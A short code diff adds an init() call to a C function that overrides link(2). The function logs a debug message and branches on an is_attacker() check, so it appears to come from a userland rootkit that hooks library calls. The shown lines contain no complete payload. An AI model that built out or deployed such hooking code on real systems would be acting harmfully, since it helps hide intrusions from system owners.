@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype */
 
 int link(const char *oldpath, const char *newpath) {
+    init();
     DEBUG(D_INFO, "called link(2) hook");
 
     if (is_attacker())
